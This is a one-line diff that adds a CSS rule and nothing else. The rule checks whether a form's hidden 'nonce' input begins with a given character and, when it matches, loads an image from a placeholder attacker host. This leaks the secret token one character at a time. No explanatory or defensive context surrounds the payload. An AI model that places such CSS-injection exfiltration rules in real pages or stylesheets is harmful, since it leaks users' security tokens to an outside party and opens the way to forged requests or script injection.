@@ -1,0 +1,1 @@
+@supports selector(:has(*)) { form:has(input[name="nonce"][value^="n"]) { background: url("https://attacker.example/n"); } }
